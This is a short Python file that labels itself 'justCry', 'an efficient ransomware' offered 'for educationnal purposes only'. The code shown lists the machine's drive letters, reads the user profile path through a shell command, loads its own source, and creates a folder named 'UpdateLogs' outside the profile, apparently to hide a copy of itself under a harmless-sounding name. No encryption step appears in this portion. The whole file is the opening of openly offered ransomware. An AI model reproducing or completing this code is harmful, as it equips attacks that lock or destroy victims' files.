'''
_AUT 'Lil_Tim'
_NAME 'justCry'
_DESC 'An efficient ransomware (for educationnal purposes only)'
_VER '1.0'
'''

import os
import subprocess

path = [i for i in range(65, 92) if os.path.exists(chr(i)+':')]

subprocess = subprocess.Popen("echo %userprofile%", shell=True, stdout=subprocess.PIPE)

user = str(subprocess.stdout.read())[2:-3]
log = user + '\\..\\..'
md = 'md UpdateLogs'
before = os.path.realpath(__file__)

with open(before, 'r') as file:
    temp = file.read()
    
os.system('cd ' + log)
os.system(md)
